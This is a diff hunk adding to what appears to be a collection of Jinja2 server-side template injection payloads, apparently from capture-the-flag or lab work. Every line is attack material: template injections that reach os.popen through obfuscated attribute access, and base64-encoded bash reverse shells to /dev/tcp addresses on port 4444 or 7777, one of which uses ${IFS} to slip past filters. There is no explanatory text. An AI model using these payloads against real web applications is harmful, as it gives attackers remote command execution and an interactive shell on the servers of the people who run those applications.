@@ -5,3 +5,7 @@ x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c
 {% include
 request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuilt\x69\x6es\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")
 ("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("echo YmFzaCAtYyAiYmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjE1Lzc3NzcgMD4mMSIK|base64 -d|bash")|attr("read")() %}
+
+echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64 
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS80NDQ0IDA+JjE=
+{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjE=${IFS}|base64${IFS}-d|bash').read()}}
